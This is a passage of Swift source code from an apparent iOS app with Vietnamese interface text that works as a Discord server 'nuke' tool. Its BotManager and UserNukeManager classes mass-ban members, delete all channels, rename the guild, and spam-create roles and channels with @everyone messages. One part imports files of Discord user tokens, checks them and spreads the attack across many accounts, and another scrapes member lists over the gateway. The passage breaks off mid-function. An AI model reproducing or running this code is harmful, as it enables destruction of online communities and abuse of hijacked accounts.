    }
    func getGuildDetail(_ g: String) async throws -> [String: Any] {
        let url = try requireURL(\.guild, replacements: ["guild_id": g])
        let (d, r) = try await session.data(from: url)
        try check(r, d); return (try JSONSerialization.jsonObject(with: d) as? [String: Any]) ?? [:]
    }
    func getRoles(_ g: String) async throws -> [GuildRole] {
        let url = try requireURL(\.guild_roles, replacements: ["guild_id": g])
        let (d, r) = try await session.data(from: url)
        try check(r, d); return try JSONDecoder().decode([GuildRole].self, from: d)
    }
    func getMember(_ g: String, uid: String) async throws -> BotMember {
        let url = try requireURL(\.guild_member, replacements: ["guild_id": g, "user_id": uid])
        let (d, r) = try await session.data(from: url)
        try check(r, d); return try JSONDecoder().decode(BotMember.self, from: d)
    }
    func getChannels(_ g: String) async throws -> [Channel] {
        let url = try requireURL(\.guild_channels, replacements: ["guild_id": g])
        let (d, r) = try await session.data(from: url)
        try check(r, d); return try JSONDecoder().decode([Channel].self, from: d)
    }
    func deleteChannel(_ c: String) async throws {
        let url = try requireURL(\.channel, replacements: ["channel_id": c])
        var req = URLRequest(url: url)
        req.httpMethod = "DELETE"; let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func createChannel(_ g: String, name: String, openEveryone: Bool) async throws -> String? {
        let url = try requireURL(\.guild_channels, replacements: ["guild_id": g])
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        var p: [String: Any] = ["name": name, "type": 0]
        if openEveryone { p["permission_overwrites"] = [["id": g, "type": 0, "allow": String(everyoneAllow), "deny": "0"]] }
        req.httpBody = try JSONSerialization.data(withJSONObject: p)
        let (d, r) = try await session.data(for: req); try check(r, d)
        return (try? JSONSerialization.jsonObject(with: d) as? [String: Any])?["id"] as? String
    }
    func sendMessage(_ c: String, content: String) async throws {
        let url = try requireURL(\.channel_messages, replacements: ["channel_id": c])
        var req = URLRequest(url: url)
        req.httpMethod = "POST"; req.httpBody = try JSONSerialization.data(withJSONObject: ["content": content])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func createRole(_ g: String, name: String) async throws {
        let url = try requireURL(\.guild_roles, replacements: ["guild_id": g])
        var req = URLRequest(url: url)
        req.httpMethod = "POST"; req.httpBody = try JSONSerialization.data(withJSONObject: ["name": name])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func renameGuild(_ g: String, newName: String) async throws {
        let url = try requireURL(\.guild, replacements: ["guild_id": g])
        var req = URLRequest(url: url)
        req.httpMethod = "PATCH"; req.httpBody = try JSONSerialization.data(withJSONObject: ["name": newName])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }
    func banMember(_ g: String, uid: String) async throws {
        let url = try requireURL(\.guild_ban, replacements: ["guild_id": g, "user_id": uid])
        var req = URLRequest(url: url)
        req.httpMethod = "PUT"; req.httpBody = try JSONSerialization.data(withJSONObject: ["delete_message_seconds": 0])
        let (d, r) = try await session.data(for: req); try check(r, d)
    }

    func fetchMembersWS(guildId: String,
                        onMember: @escaping ([String: Any]) -> Void,
                        onProgress: @escaping (Int) -> Void) async throws {
        let channels = try await getChannels(guildId)
        guard let ref = channels.first(where: { $0.type == 0 || $0.type == 5 })?.id else { return }
        let detail = try await getGuildDetail(guildId)
        let total = (detail["approximate_member_count"] as? Int) ?? (detail["member_count"] as? Int) ?? 1000

        guard SecurityGuard.shared.verifyExecutionPermit(),
              let url = RemoteFeatureVault.shared.gatewayURL(scope: scope) else { return }
        let ws = session.webSocketTask(with: url)
        ws.maximumMessageSize = 64 * 1024 * 1024
        ws.resume()
        defer { ws.cancel(with: .goingAway, reason: nil) }

        guard case .string(let hs) = try await ws.receive(),
              let hd = hs.data(using: .utf8),
              let hello = try? JSONSerialization.jsonObject(with: hd) as? [String: Any],
              let hbi = (hello["d"] as? [String: Any])?["heartbeat_interval"] as? Int else { return }
        let hbInt = Double(hbi) / 1000.0

        let hbTask = Task {
            while !Task.isCancelled {
                try? await Task.sleep(nanoseconds: UInt64(hbInt * 1_000_000_000))
                try? await ws.send(.string("{\"op\":1,\"d\":null}"))
            }
        }
        defer { hbTask.cancel() }

        let gwProps = RemoteFeatureVault.shared.gatewayIdentifyProperties(scope: scope)
        guard !gwProps.isEmpty else { return }
        let identify: [String: Any] = ["op": 2, "d": [
            "token": token, "capabilities": 125,
            "properties": gwProps,
            "compress": false,
            "presence": ["status": "online", "since": 0, "activities": [], "afk": false]
        ]]
        let idData = try JSONSerialization.data(withJSONObject: identify)
        try await ws.send(.string(String(data: idData, encoding: .utf8)!))

        var ready = false; var att = 0
        while !ready && att < 50 {
            att += 1
            if case .string(let s) = try await ws.receive(),
               let d = try? JSONSerialization.jsonObject(with: s.data(using: .utf8)!) as? [String: Any] {
                if (d["t"] as? String) == "READY" { ready = true }
                if (d["op"] as? Int) == 9 { throw NSError(domain: "WS", code: 9, userInfo: [NSLocalizedDescriptionKey: "Invalid Session"]) }
            }
        }
        guard ready else { return }

        var seen = Set<String>()
        var start = 0, end = 99
        var empty = 0
        let maxIter = max(50, total / 100 + 20); var iter = 0

        while empty < 2 && iter < maxIter && !Task.isCancelled {
            iter += 1
            let req: [String: Any] = ["op": 14, "d": [
                "guild_id": guildId, "channels": [ref: [[start, end]]], "threads": false, "typing": true
            ]]
            let rData = try JSONSerialization.data(withJSONObject: req)
            try await ws.send(.string(String(data: rData, encoding: .utf8)!))

            var gotNew = false
            let deadline = Date().addingTimeInterval(3.0)
            while Date() < deadline && !Task.isCancelled {
                let rTask = Task { try await ws.receive() }
                let tTask = Task { try? await Task.sleep(nanoseconds: 3_000_000_000); rTask.cancel() }
                defer { tTask.cancel() }
                do {
                    let msg = try await rTask.value
                    if case .string(let s) = msg,
                       let d = try? JSONSerialization.jsonObject(with: s.data(using: .utf8)!) as? [String: Any],
                       (d["t"] as? String) == "GUILD_MEMBER_LIST_UPDATE",
                       let dd = d["d"] as? [String: Any], let ops = dd["ops"] as? [[String: Any]] {
                        for op in ops {
                            let ot = op["op"] as? String
                            let items: [[String: Any]]
                            if ot == "SYNC" { items = op["items"] as? [[String: Any]] ?? [] }
                            else if ot == "UPDATE" { items = (op["item"] as? [String: Any]).map { [$0] } ?? [] }
                            else { continue }
                            for item in items {
                                if let m = item["member"] as? [String: Any],
                                   let u = m["user"] as? [String: Any],
                                   let uid = u["id"] as? String, !seen.contains(uid) {
                                    seen.insert(uid); gotNew = true; onMember(m)
                                }
                            }
                        }
                        onProgress(seen.count)
                        if seen.count >= total { return }
                        if gotNew { break }
                    }
                } catch { break }
            }
            empty = gotNew ? 0 : empty + 1
            start += 100; end += 100
            try? await Task.sleep(nanoseconds: 150_000_000)
        }
    }

    func fetchMembersHTTP(guildId: String,
                          onMember: @escaping ([String: Any]) -> Void,
                          onProgress: @escaping (Int) -> Void) async {
        var after = "0"; var count = 0
        while !Task.isCancelled {
            do {
                let url = try requireURL(\.guild_members, replacements: ["guild_id": guildId, "after": after])
                let (d, r) = try await session.data(from: url)
                guard let h = r as? HTTPURLResponse, h.statusCode == 200 else { return }
                guard let arr = try? JSONSerialization.jsonObject(with: d) as? [[String: Any]], !arr.isEmpty else { return }
                for m in arr { onMember(m) }
                count += arr.count; onProgress(count)
                if arr.count < 1000 { return }
                if let lastUser = arr.last?["user"] as? [String: Any], let lastId = lastUser["id"] as? String {
                    after = lastId
                }
                try? await Task.sleep(nanoseconds: 500_000_000)
            } catch { return }
        }
    }
}

// ==========================================
// MARK: - BOT MANAGER
// ==========================================
@MainActor
class BotManager: ObservableObject {
    @Published var config: BotConfig? = nil { didSet { saveConfig() } }
    @Published var isCheckingToken = false
    @Published var tokenError: String?
    @Published var botGuilds: [Guild] = []
    @Published var isLoadingGuilds = false
    @Published var isNuking = false
    @Published var nukeLog: [String] = []
    @Published var banSuccess = 0
    @Published var banFailed = 0
    @Published var channelsDeleted = 0
    @Published var channelsCreated = 0
    @Published var messagesSent = 0
    @Published var rolesCreated = 0
    @Published var currentPhase = ""
    @Published var phaseProgress: Double = 0
    private var isCancelled = false
    private let key = "BotConfigV1"
    private var client: BotClient? { config.map { BotClient(token: $0.token) } }

    init() { loadConfig() }
    private func saveConfig() {
        if let c = config, let d = try? JSONEncoder().encode(c) { UserDefaults.standard.set(d, forKey: key) }
        else { UserDefaults.standard.removeObject(forKey: key) }
    }
    private func loadConfig() {
        if let d = UserDefaults.standard.data(forKey: key),
           let c = try? JSONDecoder().decode(BotConfig.self, from: d) {
            config = c
        }
    }
    func setToken(_ s: String) async {
        let c = s.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !c.isEmpty else { return }
        isCheckingToken = true; tokenError = nil
        guard await LicenseManager.shared.authorizeFeature(.botNuke) else {
            tokenError = "Xác thực bản quyền thất bại."
            isCheckingToken = false
            return
        }
        do {
            let i = try await BotClient(token: c).validate()
            guard i.bot == true else { tokenError = "Không phải bot token"; isCheckingToken = false; return }
            let raw = c.replacingOccurrences(of: "Bot ", with: "", options: .caseInsensitive)
            config = BotConfig(token: raw, username: i.username, userId: i.id, avatarHash: i.avatar, discriminator: i.discriminator)
            await loadGuilds()
        } catch { tokenError = error.localizedDescription }
        isCheckingToken = false
    }
    func removeConfig() { config = nil; botGuilds = []; nukeLog = [] }
    func loadGuilds() async {
        guard config != nil else { return }
        isLoadingGuilds = true
        guard await LicenseManager.shared.authorizeFeature(.botNuke), let c = client else {
            isLoadingGuilds = false
            return
        }
        do { botGuilds = try await c.getGuilds().sorted { $0.name < $1.name }; tokenError = nil }
        catch { tokenError = error.localizedDescription }
        isLoadingGuilds = false
    }
    func stopNuke() { isCancelled = true }
    private func log(_ m: String) { nukeLog.append(m); if nukeLog.count > 800 { nukeLog.removeFirst(nukeLog.count - 800) } }
    private func reset() { banSuccess = 0; banFailed = 0; channelsDeleted = 0; channelsCreated = 0; messagesSent = 0; rolesCreated = 0; phaseProgress = 0 }

    func runNuke(guild: Guild, options: NukeConfig) async {
        guard config != nil else { return }
        guard await LicenseManager.shared.authorizeFeature(.botNuke), let c = client else {
            tokenError = "Xác thực bản quyền thất bại."
            return
        }
        isNuking = true; isCancelled = false; nukeLog = []; reset()
        BackgroundManager.shared.start(tag: "botNuke")
        NowPlayingHelper.shared.registerSession(
            NowPlayingSessionState(
                feature: .botNuke,
                title: "Bot Nuke • \(guild.name)",
                detail: "Đang khởi chạy...",
                controlsHint: "⏸ Dừng Bot Nuke • ◀◀/▶▶ Chuyển tác vụ",
                isPaused: false,
                elapsedTime: 0,
                duration: 100,
                isLiveStream: false,
                onPause: { [weak self] in self?.stopNuke() },
                onStop: { [weak self] in self?.stopNuke() }
            ),
            focus: true
        )
        let gid = guild.id
        log("Bắt đầu nuke: \(guild.name)")
        let totalSteps = options.stepOrder.filter { options.enabledSteps.contains($0) }.count
        var stepDone = 0

        for step in options.stepOrder {
            if isCancelled { break }
            guard options.enabledSteps.contains(step) else { continue }
            currentPhase = step.rawValue
            phaseProgress = totalSteps > 0 ? Double(stepDone) / Double(totalSteps) : 0
            log("--- \(step.rawValue) ---")
            NowPlayingHelper.shared.updateSession(
                .botNuke,
                title: "Bot Nuke • \(step.rawValue)",
                detail: "\(banSuccess) ban • \(channelsDeleted) xoá • \(channelsCreated) tạo",
                elapsedTime: phaseProgress * 100.0,
                duration: 100.0,
                isLiveStream: false
            )
            switch step {
            case .massBan: await doMassBan(c, gid, options: options)
            case .deleteChannels: await doDeleteChannels(c, gid, options: options)
            case .renameGuild:
                if !options.newGuildName.isEmpty {
                    do { try await c.renameGuild(gid, newName: options.newGuildName); log("  Đổi tên OK") }
                    catch { log("  Lỗi: \(error.localizedDescription)") }
                }
            case .createRoles:
                rolesCreated = await doCreateRoles(c, gid, options: options)
                log("  Role đã tạo: \(rolesCreated)")
            case .createChannels:
                let (cc, ss) = await doCreateChannels(c, gid, options: options)
                channelsCreated = cc; messagesSent = ss
                log("  Kênh đã tạo: \(cc), tin đã gửi: \(ss)")
            }
            stepDone += 1
        }
        currentPhase = isCancelled ? "Đã dừng" : "Hoàn tất"
        phaseProgress = 1.0
        log(isCancelled ? "Đã dừng" : "XONG")
        log("=== TỔNG KẾT ===")
        log("Ban: \(banSuccess) OK / \(banFailed) FAIL")
        log("Xóa kênh: \(channelsDeleted)")
        log("Tạo kênh: \(channelsCreated)")
        log("Tin nhắn: \(messagesSent)")
        log("Role: \(rolesCreated)")
        isNuking = false
        BackgroundManager.shared.stop(tag: "botNuke")
        NowPlayingHelper.shared.endSession(.botNuke)
    }

    private func doMassBan(_ c: BotClient, _ gid: String, options: NukeConfig) async {
        guard let cfg = config else { return }
        do {
            let detail = try await c.getGuildDetail(gid)
            let ownerId = detail["owner_id"] as? String
            let botMember = try await c.getMember(gid, userId: cfg.userId)
            let roles = try await c.getRoles(gid)
            let roleMap = Dictionary(uniqueKeysWithValues: roles.map { ($0.id, $0) })
            let botMax = (botMember.roles ?? []).compactMap { roleMap[$0]?.position }.max() ?? 0
            log("  Bot role pos: \(botMax)")
            guard botMax > 0 else { log("  Bot role quá thấp"); return }
            var after = "0"
            while !isCancelled {
                let members: [BotMember]
                do { members = try await c.getMembers(gid, after: after) }
                catch {
                    log("  Lỗi: \(error.localizedDescription)")
                    if error.localizedDescription.contains("403") { log("  Bật SERVER MEMBERS INTENT") }
                    return
                }
                if members.isEmpty { break }
                for m in members {
                    if isCancelled { break }
                    guard let uid = m.user?.id else { continue }
                    if uid == cfg.userId || uid == ownerId || m.user?.bot == true { continue }
                    let pos = (m.roles ?? []).compactMap { roleMap[$0]?.position }.max() ?? 0
                    if pos >= botMax { continue }
                    do { try await c.banMember(gid, userId: uid); banSuccess += 1 }
                    catch { banFailed += 1 }
                    if options.banDelay > 0 {
                        try? await Task.sleep(nanoseconds: UInt64(options.banDelay * 1_000_000_000))
                    }
                    if (banSuccess + banFailed) % 10 == 0 {
                        log("  Ban: \(banSuccess) OK / \(banFailed) FAIL")
                    }
                }
                if members.count < 1000 { break }
                after = members.last?.user?.id ?? after
                try? await Task.sleep(nanoseconds: 500_000_000)
            }
            log("  Ban xong: \(banSuccess) OK / \(banFailed) FAIL")
        } catch { log("  Lỗi mass ban: \(error.localizedDescription)") }
    }

    private func doDeleteChannels(_ c: BotClient, _ gid: String, options: NukeConfig) async {
        do {
            let chans = try await c.getChannels(gid)
            log("  Tìm \(chans.count) kênh")
            var count = 0
            await withTaskGroup(of: Bool.self) { group in
                var inf = 0
                for ch in chans {
                    if isCancelled { break }
                    let d = options.deleteDelay
                    group.addTask {
                        if d > 0 { try? await Task.sleep(nanoseconds: UInt64(d * 1_000_000_000)) }
                        do { try await c.deleteChannel(ch.id); return true } catch { return false }
                    }
                    inf += 1
                    if inf >= 10 { if let r = await group.next(), r { count += 1 }; inf -= 1 }
                }
                for await r in group { if r { count += 1 } }
            }
            channelsDeleted = count
            log("  Đã xóa: \(count)")
        } catch { log("  Lỗi: \(error.localizedDescription)") }
    }

    private func doCreateRoles(_ c: BotClient, _ gid: String, options: NukeConfig) async -> Int {
        var count = 0
        await withTaskGroup(of: Bool.self) { group in
            var inf = 0
            for _ in 0..<options.roleCount {
                if isCancelled { break }
                let d = options.createRoleDelay
                let name = options.roleName
                group.addTask {
                    if d > 0 { try? await Task.sleep(nanoseconds: UInt64(d * 1_000_000_000)) }
                    do { try await c.createRole(gid, name: name); return true } catch { return false }
                }
                inf += 1
                if inf >= 10 { if let r = await group.next(), r { count += 1 }; inf -= 1 }
            }
            for await r in group { if r { count += 1 } }
        }
        return count
    }

    private func doCreateChannels(_ c: BotClient, _ gid: String, options: NukeConfig) async -> (Int, Int) {
        var created = 0, sent = 0
        var content = options.messageContent
        if options.tagEveryone && !content.contains("@everyone") { content += "\n\n@everyone" }
        await withTaskGroup(of: (Bool, Bool).self) { group in
            var inf = 0
            for _ in 0..<options.channelCount {
                if isCancelled { break }
                let cd = options.createChDelay
                let md = options.msgDelay
                let cn = options.channelName
                group.addTask {
                    if cd > 0 { try? await Task.sleep(nanoseconds: UInt64(cd * 1_000_000_000)) }
                    do {
                        guard let chId = try await c.createChannel(gid, name: cn, openEveryone: true) else { return (false, false) }
                        if !content.trimmingCharacters(in: .whitespaces).isEmpty {
                            if md > 0 { try? await Task.sleep(nanoseconds: UInt64(md * 1_000_000_000)) }
                            do { try await c.sendMessage(chId, content: content); return (true, true) }
                            catch { return (true, false) }
                        }
                        return (true, false)
                    } catch { return (false, false) }
                }
                inf += 1
                if inf >= 8 {
                    if let (cc, ss) = await group.next() { if cc { created += 1 }; if ss { sent += 1 } }
                    inf -= 1
                }
            }
            for await (cc, ss) in group { if cc { created += 1 }; if ss { sent += 1 } }
        }
        return (created, sent)
    }
}

// ==========================================
// MARK: - USER NUKE MANAGER
// ==========================================
@MainActor
class UserNukeManager: ObservableObject {
    @Published var tokens: [TokenInfo] = [] { didSet { saveTokens() } }
    @Published var selectedTokenIds: Set<UUID> = []
    @Published var isImporting = false
    @Published var importError: String?
    @Published var tokenGuilds: [UUID: [NukeGuild]] = [:]
    @Published var eligibleGuilds: [Guild] = []
    @Published var isLoadingGuilds = false
    @Published var isNuking = false
    @Published var nukeLog: [String] = []
    @Published var banSuccess = 0
    @Published var banFailed = 0
    @Published var channelsDeleted = 0
    @Published var channelsCreated = 0
    @Published var messagesSent = 0
    @Published var rolesCreated = 0
    @Published var currentPhase = ""
    @Published var phaseProgress: Double = 0
    @Published var membersScanned = 0

    private var isCancelled = false
    private let key = "UserNukeTokensV1"

    init() { loadTokens() }
    private func saveTokens() {
        if let d = try? JSONEncoder().encode(tokens) { UserDefaults.standard.set(d, forKey: key) }
    }
    private func loadTokens() {
        if let d = UserDefaults.standard.data(forKey: key),
           let s = try? JSONDecoder().decode([TokenInfo].self, from: d) { tokens = s }
    }
    func addTokenManually(_ raw: String) async -> Bool {
        let clean = raw.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !clean.isEmpty, !tokens.contains(where: { $0.token == clean }) else { return false }
        isImporting = true
        defer { isImporting = false }
        guard await LicenseManager.shared.authorizeFeature(.userNuke) else {
            importError = "Xác thực bản quyền thất bại."
            return false
        }
        do {
            let u = try await UserNukeClient(token: clean).validate()
            tokens.append(TokenInfo(token: clean, userId: u.id,
                                    username: u.globalName ?? u.username,
                                    avatarHash: u.avatar, isValid: true))
            return true
        } catch {
            tokens.append(TokenInfo(token: clean, userId: "0",
                                    username: "Token chết", avatarHash: nil, isValid: false))
            return false
        }
    }
    func importFromFile(url: URL) async {
        let got = url.startAccessingSecurityScopedResource()
        defer { if got { url.stopAccessingSecurityScopedResource() } }
        try? FileManager.default.startDownloadingUbiquitousItem(at: url)
        var data: Data?
        let co = NSFileCoordinator(); var err: NSError?
        co.coordinate(readingItemAt: url, options: [], error: &err) { u in data = try? Data(contentsOf: u) }
        if data == nil { data = try? Data(contentsOf: url) }
        guard let d = data else { importError = "Không đọc được file"; return }
        var text: String?
        for enc in [String.Encoding.utf8, .utf16, .utf16LittleEndian, .utf16BigEndian, .windowsCP1252, .isoLatin1, .ascii] {
            if let s = String(data: d, encoding: enc), !s.isEmpty { text = s; break }
        }
        if text == nil { text = String(decoding: d, as: UTF8.self) }
        guard let t = text else { importError = "File rỗng"; return }
        let lines = t.replacingOccurrences(of: "\u{FEFF}", with: "")
            .components(separatedBy: .newlines)
            .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
            .filter { !$0.isEmpty }
        guard !lines.isEmpty else { importError = "Không có token"; return }
        guard await LicenseManager.shared.authorizeFeature(.userNuke) else {
            importError = "Xác thực bản quyền thất bại."
            return
        }
        isImporting = true; importError = nil
        if lines.count > 1 {
            BackgroundManager.shared.start(tag: "tokenCheck")
            NowPlayingHelper.shared.registerSession(
                NowPlayingSessionState(
                    feature: .tokenCheck,
                    title: "Check \(lines.count) Token (Nuke)",
                    detail: "0/\(lines.count) đã kiểm tra",
                    controlsHint: "Đang import & check danh sách Token",
                    isPaused: false,
                    elapsedTime: 0,
                    duration: Double(lines.count),
                    isLiveStream: false
                ),
                focus: true
            )
        }
        defer {
            if lines.count > 1 {
                NowPlayingHelper.shared.endSession(.tokenCheck)
                BackgroundManager.shared.stop(tag: "tokenCheck")
            }
        }
        for (idx, line) in lines.enumerated() {
            if !tokens.contains(where: { $0.token == line }) {
                do {
                    let u = try await UserNukeClient(token: line).validate()
                    tokens.append(TokenInfo(token: line, userId: u.id, username: u.globalName ?? u.username, avatarHash: u.avatar, isValid: true))
                } catch {
                    tokens.append(TokenInfo(token: line, userId: "0", username: "Token chết", avatarHash: nil, isValid: false))
                }
            }
            if lines.count > 1 {
                NowPlayingHelper.shared.updateSession(
                    .tokenCheck,
                    detail: "\(idx + 1)/\(lines.count) token đã kiểm tra",
                    elapsedTime: Double(idx + 1),
                    duration: Double(lines.count),
                    isLiveStream: false
                )
            }
        }
        isImporting = false
    }
    func removeToken(_ id: UUID) {
        tokens.removeAll { $0.id == id }
        selectedTokenIds.remove(id); tokenGuilds.removeValue(forKey: id); recomputeEligible()
    }
    func clearAll() { tokens = []; selectedTokenIds = []; tokenGuilds = [:]; eligibleGuilds = [] }
    func clearSelection() { selectedTokenIds = []; eligibleGuilds = [] }
    func toggleSelection(_ t: TokenInfo) {
        guard t.isValid else { return }
        if selectedTokenIds.contains(t.id) { selectedTokenIds.remove(t.id) }
        else { selectedTokenIds.insert(t.id) }
        recomputeEligible()
        if !tokenGuilds.keys.contains(t.id) { Task { await loadGuildsForToken(t) } }
    }
    func loadAllGuildsForSelected() async {
        isLoadingGuilds = true
        guard await LicenseManager.shared.authorizeFeature(.userNuke) else {
            isLoadingGuilds = false
            return
        }
        for id in selectedTokenIds {
            guard let t = tokens.first(where: { $0.id == id }), t.isValid else { continue }
            await loadGuildsForToken(t, skipAuth: true)
        }
        recomputeEligible(); isLoadingGuilds = false
    }
    private func loadGuildsForToken(_ t: TokenInfo, skipAuth: Bool = false) async {
        if !skipAuth {
            guard await LicenseManager.shared.authorizeFeature(.userNuke) else { return }
        }
        do { tokenGuilds[t.id] = try await UserNukeClient(token: t.token).getGuildsWithPerms() }
        catch { tokenGuilds[t.id] = [] }
        recomputeEligible()
    }
    func recomputeEligible() {
        guard !selectedTokenIds.isEmpty else { eligibleGuilds = []; return }
        var unionIds: Set<String> = []
        var unionMap: [String: NukeGuild] = [:]
        for id in selectedTokenIds {
            guard let gs = tokenGuilds[id] else { eligibleGuilds = []; return }
            for g in gs where g.canDoAnything {
                unionIds.insert(g.id)
                if unionMap[g.id] == nil { unionMap[g.id] = g }
            }
        }
        eligibleGuilds = unionIds.compactMap { unionMap[$0] }
            .map { Guild(id: $0.id, name: $0.name, icon: $0.icon) }
            .sorted { $0.name < $1.name }
    }
    func permissionsForGuild(_ guildId: String) -> GuildPermissions {
        var perms = GuildPermissions()
        for tokenId in selectedTokenIds {
            guard let gs = tokenGuilds[tokenId],
                  let g = gs.first(where: { $0.id == guildId }) else { continue }
            if g.canMassBan { perms.massBan = true }
            if g.canDeleteChannels { perms.deleteChannels = true }
            if g.canCreateChannels { perms.createChannels = true }
            if g.canCreateRoles { perms.createRoles = true }
            if g.canRenameGuild { perms.renameGuild = true }
        }
        return perms
    }
    private func clientsWithBanPerm(guildId: String, all: [(UUID, UserNukeClient)]) -> [UserNukeClient] {
        all.filter { id, _ in tokenGuilds[id]?.first(where: { $0.id == guildId })?.canMassBan ?? false }.map { $0.1 }
    }
    private func clientsWithChannelPerm(guildId: String, all: [(UUID, UserNukeClient)]) -> [UserNukeClient] {
        all.filter { id, _ in
            let g = tokenGuilds[id]?.first(where: { $0.id == guildId })
            return g?.canDeleteChannels ?? false || g?.canCreateChannels ?? false
        }.map { $0.1 }
    }
    private func clientsWithRolePerm(guildId: String, all: [(UUID, UserNukeClient)]) -> [UserNukeClient] {
        all.filter { id, _ in tokenGuilds[id]?.first(where: { $0.id == guildId })?.canCreateRoles ?? false }.map { $0.1 }
    }
    private func clientsWithRenamePerm(guildId: String, all: [(UUID, UserNukeClient)]) -> [UserNukeClient] {
        all.filter { id, _ in tokenGuilds[id]?.first(where: { $0.id == guildId })?.canRenameGuild ?? false }.map { $0.1 }
    }
    func stop() { isCancelled = true }
    private func log(_ m: String) { nukeLog.append(m); if nukeLog.count > 800 { nukeLog.removeFirst(nukeLog.count - 800) } }
    private func reset() { banSuccess = 0; banFailed = 0; channelsDeleted = 0; channelsCreated = 0; messagesSent = 0; rolesCreated = 0; membersScanned = 0; phaseProgress = 0 }

    func runNuke(guild: Guild, options: NukeConfig) async {
        guard !selectedTokenIds.isEmpty else { return }
        let sel = tokens.filter { selectedTokenIds.contains($0.id) && $0.isValid }
        guard !sel.isEmpty else { return }
        guard await LicenseManager.shared.authorizeFeature(.userNuke) else {
            importError = "Xác thực bản quyền thất bại."
            return
        }

        isNuking = true; isCancelled = false; nukeLog = []; reset()
        BackgroundManager.shared.start(tag: "userNuke")
        NowPlayingHelper.shared.registerSession(
            NowPlayingSessionState(
                feature: .userNuke,
                title: "User Nuke • \(guild.name)",
                detail: "Đang khởi chạy (\(sel.count) token)...",
                controlsHint: "⏸ Dừng User Nuke • ◀◀/▶▶ Chuyển tác vụ",
                isPaused: false,
                elapsedTime: 0,
                duration: 100,
                isLiveStream: false,
                onPause: { [weak self] in self?.stop() },
                onStop: { [weak self] in self?.stop() }
            ),
            focus: true
        )
        let gid = guild.id
        let allClients: [(UUID, UserNukeClient)] = sel.map { ($0.id, UserNukeClient(token: $0.token)) }
        guard let scan = allClients.first?.1 else { return }

        log("Bắt đầu nuke: \(guild.name)")
        log("Dùng \(allClients.count) token")
        let totalSteps = options.stepOrder.filter { options.enabledSteps.contains($0) }.count
        var stepDone = 0

        for step in options.stepOrder {
            if isCancelled { break }
            guard options.enabledSteps.contains(step) else { continue }
            currentPhase = step.rawValue
            phaseProgress = totalSteps > 0 ? Double(stepDone) / Double(totalSteps) : 0
            log("--- \(step.rawValue) ---")
            NowPlayingHelper.shared.updateSession(
                .userNuke,
                title: "User Nuke • \(step.rawValue)",
                detail: "\(banSuccess) ban • \(channelsDeleted) xoá • \(channelsCreated) tạo",
                elapsedTime: phaseProgress * 100.0,
                duration: 100.0,
                isLiveStream: false
            )
            switch step {
            case .massBan:
                let bc = clientsWithBanPerm(guildId: gid, all: allClients)
                if bc.isEmpty { log("  Bỏ qua: không token nào có quyền ban"); break }
                await doMassBanScan(scan, clients: bc, gid: gid, options: options)
            case .deleteChannels:
                let cc = clientsWithChannelPerm(guildId: gid, all: allClients)
                if cc.isEmpty { log("  Bỏ qua: không token nào có quyền quản lý kênh"); break }
                await doDeleteChannels(cc, gid, options: options)
            case .renameGuild:
                let rc = clientsWithRenamePerm(guildId: gid, all: allClients)
                if rc.isEmpty { log("  Bỏ qua: không token nào có quyền đổi tên"); break }
                if !options.newGuildName.isEmpty {
                    do { try await rc[0].renameGuild(gid, newName: options.newGuildName); log("  Đổi tên OK") }
                    catch { log("  Lỗi: \(error.localizedDescription)") }
                }
            case .createRoles:
                let rc = clientsWithRolePerm(guildId: gid, all: allClients)
                if rc.isEmpty { log("  Bỏ qua: không token nào có quyền quản lý role"); break }
                rolesCreated = await doCreateRoles(rc, gid, options: options)
                log("  Role đã tạo: \(rolesCreated)")
            case .createChannels:
                let cc = clientsWithChannelPerm(guildId: gid, all: allClients)
                if cc.isEmpty { log("  Bỏ qua: không token nào có quyền quản lý kênh"); break }
                let (c, s) = await doCreateChannels(cc, gid, options: options)
                channelsCreated = c; messagesSent = s
                log("  Kênh đã tạo: \(c), tin đã gửi: \(s)")
            }
            stepDone += 1
        }
        currentPhase = isCancelled ? "Đã dừng" : "Hoàn tất"
        phaseProgress = 1.0
        log(isCancelled ? "Đã dừng" : "XONG")
        log("=== TỔNG KẾT ===")
        log("Ban: \(banSuccess) OK / \(banFailed) FAIL")
        log("Xóa kênh: \(channelsDeleted)")
        log("Tạo kênh: \(channelsCreated)")
        log("Tin nhắn: \(messagesSent)")
        log("Role: \(rolesCreated)")
        isNuking = false
        BackgroundManager.shared.stop(tag: "userNuke")
        NowPlayingHelper.shared.endSession(.userNuke)
    }

    private func doMassBanScan(_ scan: UserNukeClient, clients: [UserNukeClient], gid: String, options: NukeConfig) async {
        do {
            let roles = try await scan.getRoles(gid)
            let roleMap = Dictionary(uniqueKeysWithValues: roles.map { ($0.id, $0) })
            let detail = try await scan.getGuildDetail(gid)
            let ownerId = detail["owner_id"] as? String
            let myUser = try await scan.validate()
            let myM = try await scan.getMember(gid, uid: myUser.id)
            let myMax = (myM.roles ?? []).compactMap { roleMap[$0]?.position }.max() ?? 0
            log("  Scan role pos: \(myMax)")

            var rolePosition = 0
            var filterByRole = false
            if !options.banRoleId.isEmpty, let tr = roleMap[options.banRoleId] {
                rolePosition = tr.position; filterByRole = true
                log("  Ban theo role: \(tr.name) (pos \(rolePosition))")
            }

            var candidates: [String] = []
            let lock = NSLock()
            log("  Đang quét WS...")
            do {
                try await scan.fetchMembersWS(guildId: gid, onMember: { m in
                    guard let u = m["user"] as? [String: Any], let uid = u["id"] as? String else { return }
                    if uid == myUser.id || uid == ownerId || (u["bot"] as? Bool) == true { return }
                    let mr = m["roles"] as? [String] ?? []
                    let mm = mr.compactMap { roleMap[$0]?.position }.max() ?? 0
                    if mm >= myMax { return }
                    if filterByRole {
                        if !mr.contains(options.banRoleId) { return }
                        if mr.compactMap({ roleMap[$0]?.position }).contains(where: { $0 > rolePosition }) { return }
                    }
                    lock.lock(); candidates.append(uid); let n = candidates.count; lock.unlock()
                    if n % 5 == 0 { Task { @MainActor in self.membersScanned = n } }
                }, onProgress: { c in Task { @MainActor in self.membersScanned = c } })
            } catch {
                log("  WS lỗi: \(error.localizedDescription) — thử HTTP")
                await scan.fetchMembersHTTP(guildId: gid, onMember: { m in
                    guard let u = m["user"] as? [String: Any], let uid = u["id"] as? String else { return }
